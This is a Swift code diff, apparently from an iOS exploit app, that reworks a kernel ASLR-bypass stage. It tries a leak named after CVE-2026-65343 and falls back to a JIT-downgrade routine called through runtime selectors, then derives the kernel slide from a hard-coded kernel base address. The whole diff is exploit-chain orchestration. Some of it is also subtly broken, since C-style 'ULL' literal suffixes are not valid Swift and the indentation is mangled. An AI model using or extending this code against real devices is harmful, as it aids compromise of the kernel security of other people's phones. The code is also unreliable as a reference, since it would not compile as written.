@@ -275,35 +275,98 @@ class Lum1naViewModel: ObservableObject {
     // MARK: - Stage Implementations
     
     private func performKASLRStage() async -> UInt64? {
-        exploitState = .executingKASLR
-        log("[*] Stage: KASLR Bypass", level: .info)
-        log("[*] ├─ Using CVE-2026-65343-AKS...", level: .info)
-        
-        guard let aksClass = NSClassFromString("CVE_2026_65343_AKS") as? NSObject.Type,
-              let aksInstance = aksClass.perform(NSSelectorFromString("sharedInstance"))?.takeUnretainedValue() as? NSObject,
-              aksInstance.responds(to: NSSelectorFromString("leakKernelSlide")) else {
-            log("[-] ├─ CVE_2026_65343_AKS not available", level: .error)
-            return nil
-        }
-        
-        let result = aksInstance.perform(NSSelectorFromString("leakKernelSlide"))?.takeUnretainedValue() as? NSNumber
-        let slide = result?.uint64Value ?? 0
-        
-        guard slide != 0 else {
-            log("[-] ├─ AKS leak failed", level: .error)
-            return nil
-        }
-        
-        guard slide & 0x3FFF == 0 else {
-            log("[-] ├─ Slide not page-aligned: 0x\(String(slide, radix: 16))", level: .error)
-            return nil
-        }
-        
-        log("[+] ├─ Kernel slide: 0x\(String(slide, radix: 16))", level: .success)
-        log("[+] └─ KASLR bypass complete", level: .success)
-        
+    exploitState = .executingKASLR
+    log("[*] Stage: KASLR Bypass", level: .info)
+    
+    // Try AKS first
+    log("[*] ├─ Trying CVE-2026-65343-AKS...", level: .info)
+    if let slide = tryAKS() {
+        log("[+] ├─ AKS succeeded", level: .success)
         return slide
     }
+    
+    // Fallback to P005
+    log("[*] ├─ AKS failed, trying P005-JIT...", level: .info)
+    if let slide = tryP005() {
+        log("[+] ├─ P005 succeeded", level: .success)
+        return slide
+    }
+    
+    log("[-] ├─ All KASLR methods failed", level: .error)
+    return nil
+}
+
+private func tryAKS() -> UInt64? {
+    guard let cls = NSClassFromString("CVE_2026_65343_AKS") as? NSObject.Type,
+          let inst = cls.perform(NSSelectorFromString("sharedInstance"))?.takeUnretainedValue() as? NSObject,
+          inst.responds(to: NSSelectorFromString("leakKernelSlide")) else {
+        return nil
+    }
+    
+    let result = inst.perform(NSSelectorFromString("leakKernelSlide"))?.takeUnretainedValue() as? NSNumber
+    return result?.uint64Value != 0 ? result?.uint64Value : nil
+}
+
+private func tryP005() -> UInt64? {
+    guard let cls = NSClassFromString("P005JIT") as? NSObject.Type,
+          let inst = cls.init() as? NSObject else {
+        return nil
+    }
+    
+    // initP005
+    let initSel = NSSelectorFromString("initP005")
+    guard inst.responds(to: initSel),
+          let initResult = inst.perform(initSel)?.takeUnretainedValue() as? NSNumber,
+          initResult.boolValue else {
+        log("[!] P005 init failed (missing JIT entitlement?)", level: .error)
+        return nil
+    }
+    
+    // setupJITContext
+    let setupSel = NSSelectorFromString("setupJITContext")
+    guard inst.responds(to: setupSel),
+          let setupResult = inst.perform(setupSel)?.takeUnretainedValue() as? NSNumber,
+          setupResult.boolValue else {
+        return nil
+    }
+    
+    // triggerJITDowngrade
+    let triggerSel = NSSelectorFromString("triggerJITDowngrade")
+    guard inst.responds(to: triggerSel) else { return nil }
+    inst.perform(triggerSel)
+    
+    // obtainKernelLeak
+    let leakSel = NSSelectorFromString("obtainKernelLeak")
+    guard inst.responds(to: leakSel),
+          let leakResult = inst.perform(leakSel)?.takeUnretainedValue() as? NSNumber,
+          leakResult.boolValue else {
+        return nil
+    }
+    
+    // getLeakedKernelAddress
+    let addrSel = NSSelectorFromString("getLeakedKernelAddress")
+    guard inst.responds(to: addrSel) else { return nil }
+    let addrResult = inst.perform(addrSel)?.takeUnretainedValue() as? NSNumber
+    let leakedPtr = addrResult?.uint64Value ?? 0
+    
+    guard leakedPtr != 0 else { return nil }
+    
+    // Calculate slide from leaked kernel pointer
+    let kernelBase = 0xFFFFFFF007004000ULL
+    let slide = leakedPtr - kernelBase
+    
+    guard slide < 0x100000000ULL && (slide & 0x3FFF) == 0 else {
+        return nil
+    }
+    
+    // cleanup
+    let cleanupSel = NSSelectorFromString("cleanup")
+    if inst.responds(to: cleanupSel) {
+        inst.perform(cleanupSel)
+    }
+    
+    return slide
+}
     
     // MARK: - Helpers
     
